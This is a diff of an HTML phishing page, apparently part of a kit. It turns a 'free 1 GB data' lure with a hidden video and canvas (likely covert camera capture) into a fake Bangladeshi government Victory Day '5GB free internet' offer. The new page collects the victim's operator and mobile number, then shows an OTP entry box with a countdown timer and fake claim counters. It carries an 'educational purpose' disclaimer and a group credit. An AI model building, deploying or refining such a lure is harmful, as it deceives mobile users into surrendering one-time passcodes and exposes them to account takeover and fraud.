@@ -1,106 +1,211 @@
-<!DOCTYPE html><html lang="en"><head>
+<!DOCTYPE html>
+<html lang="bn">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free 1 GB Data Booster</title>
+    <title>বিজয় দিবস উপলক্ষে ৫GB ফ্রি ইন্টারনেট</title>
+
     <style>
         body {
-            background: linear-gradient(to right, #00c6ff, #0072ff);
+            background: linear-gradient(to right, #006a4e, #f42a41);
             font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            overflow: hidden;
+        }
+
+        #confetti {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .flag-wave {
+            position: fixed;
+            top: 15px;
+            width: 100%;
+            text-align: center;
+            font-size: 42px;
+            animation: wave 2s infinite ease-in-out;
+            z-index: 2;
+        }
+
+        @keyframes wave {
+            0% { transform: rotate(0deg); }
+            50% { transform: rotate(6deg); }
+            100% { transform: rotate(0deg); }
         }
 
         .container {
-            background: #fff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            background: #ffffff;
+            padding: 22px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
             text-align: center;
             width: 100%;
-            max-width: 400px;
+            max-width: 420px;
+            position: relative;
+            z-index: 3;
         }
 
         h1 {
             font-size: 24px;
-            color: #333;
-            margin-bottom: 20px;
+            color: #006a4e;
+            margin-bottom: 8px;
+        }
+
+        .sub-title {
+            color: #d32f2f;
+            font-size: 15px;
+            margin-bottom: 15px;
         }
 
         .notice {
-            background: #ffecb3;
-            padding: 10px;
-            border: 1px solid #ffeb3b;
-            border-radius: 5px;
-            margin-bottom: 20px;
+            background: #e8f5e9;
+            padding: 12px;
+            border: 1px solid #43a047;
+            border-radius: 6px;
+            margin-bottom: 18px;
             font-size: 14px;
+            color: #1b5e20;
         }
 
         .form-box {
-            border: 1px solid #ddd;
-            padding: 20px;
+            border: 1px dashed #ccc;
+            padding: 18px;
             border-radius: 10px;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
 
-        select, input[type="text"] {
-            width: calc(100% - 20px);
+        select, input {
+            width: 100%;
             padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
+            margin-bottom: 12px;
+            border: 1px solid #bbb;
+            border-radius: 6px;
+            font-size: 14px;
         }
 
         .submit-button {
-            background: #00c853;
+            background: #006a4e;
             color: #fff;
             border: none;
-            padding: 10px;
-            border-radius: 5px;
+            padding: 12px;
+            border-radius: 6px;
             width: 100%;
+            font-size: 16px;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: 0.3s;
         }
 
         .submit-button:hover {
-            background: #00b04f;
+            background: #004d38;
         }
 
         .user-count {
             font-size: 14px;
             color: #333;
+            margin-top: 8px;
         }
 
-        video {
-            display: none;
+        .disclaimer {
+            font-size: 12px;
+            color: #666;
+            margin-top: 15px;
+        }
+
+        footer {
+            position: fixed;
+            bottom: 8px;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: #ffffffcc;
+            z-index: 3;
+        }
+
+        footer span {
+            color: #a5ffdc;
+            font-weight: bold;
         }
     </style>
 </head>
+
 <body>
-    <div class="container">
-        <h1>🚀 Free 1 GB Network Data</h1>
-        <div class="notice">�&nbsp; Free 1GB data pack recharge for everyone from us.</div>
-        <div class="form-box">
-            <form id="data-form">
-                <select id="operator" required="">
-                    <option value="">Select Operator</option>
-                    <option value="Jio">Jio</option>
-                    <option value="Airtel">Airtel</option>
-                    <option value="VI">VI</option>
-                    <option value="BSNL">BSNL</option>
-                </select>
-                <input type="text" id="mobile-number" placeholder="Mobile Number" required="" maxlength="10" pattern="\d{10}" title="Enter 10 digit mobile number">
-                <button type="submit" class="submit-button">🎁 Claim</button>
-            </form>
-        </div>
-        <div class="user-count">😃 Claimed 3589/5000 users.</div>
-        <video id="video" autoplay=""></video>
-        <canvas id="canvas" style="display:none;"></canvas>
+
+<canvas id="confetti"></canvas>
+<div class="flag-wave">🇧🇩</div>
+
+<div class="container">
+    <h1>🇧🇩 বিজয় দিবস বিশেষ উপহার</h1>
+    <div class="sub-title">সরকারের পক্ষ থেকে ৫GB ফ্রি ইন্টারনেট</div>
+
+    <div class="notice">
+        🎉 মহান বিজয় দিবস উপলক্ষে সকল মোবাইল ব্যবহারকারীর জন্য  
+        <strong>৫GB ফ্রি ডাটা (২৪ ঘণ্টা)</strong>
     </div>
-    <script src="script.js"></script>
 
+    <div class="form-box">
 
-</body></html>
+        <!-- OTP BOX -->
+        <div id="otp-box" style="display:none;">
+            <p>📩 আপনার নাম্বারে একটি OTP পাঠানো হয়েছে</p>
+
+            <input type="text" id="otp"
+                   placeholder="৬ ডিজিট OTP"
+                   maxlength="6"
+                   style="text-align:center;letter-spacing:5px;">
+
+            <button id="verifyBtn" class="submit-button">
+                ✅ OTP Verify
+            </button>
+
+            <p id="timer" style="margin-top:8px;color:#d32f2f;">
+                ⏳ সময় বাকি: 60 সেকেন্ড
+            </p>
+        </div>
+
+        <!-- FORM -->
+        <form id="data-form">
+            <select required>
+                <option value="">মোবাইল অপারেটর নির্বাচন করুন</option>
+                <option>Grameenphone</option>
+                <option>Robi</option>
+                <option>Airtel</option>
+                <option>Banglalink</option>
+                <option>Teletalk</option>
+            </select>
+
+            <input type="text"
+                   placeholder="মোবাইল নাম্বার (01XXXXXXXXX)"
+                   maxlength="11"
+                   pattern="01[0-9]{9}"
+                   required>
+
+            <button class="submit-button">🎁 ৫GB ডাটা ক্লেইম করুন</button>
+        </form>
+    </div>
+
+    <div class="user-count">
+        👥 ইতিমধ্যে 7,842 / 10,000 জন গ্রহণ করেছেন
+    </div>
+
+    <div class="disclaimer">
+        ⚠️ এটি শুধুমাত্র Educational / Demo Purpose এর জন্য।
+    </div>
+</div>
+
+<footer>
+    © 2025 | Educational Purpose Only<br>
+    <span>By The Rebel Squad</span>
+</footer>
+
+<script src="script.js"></script>
+<script src="animation.js"></script>
+
+</body>
+</html>
